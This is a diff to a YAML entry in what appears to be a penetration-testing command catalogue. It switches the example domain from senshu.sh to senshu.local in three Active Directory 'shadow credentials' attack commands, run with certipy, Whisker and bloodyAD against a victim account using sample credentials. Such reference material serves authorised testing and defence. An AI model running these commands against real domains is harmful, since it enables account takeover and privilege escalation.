@@ -4,9 +4,9 @@ description: |
 commands:
   - have: Credentials
     cmd: |
-      certipy shadow auto -target dc01.senshu.sh -u sec_user@senshu.sh -p 'P@ssw0rd' -account victim
-      .\Whisker.exe add /target:victim /domain:senshu.sh /dc:dc01.senshu.sh
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials victim
+      certipy shadow auto -target dc01.senshu.local -u sec_user@senshu.local -p 'P@ssw0rd' -account victim
+      .\Whisker.exe add /target:victim /domain:senshu.local /dc:dc01.senshu.local
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add shadowCredentials victim
 phase:
   - Exploitation
 target_os:
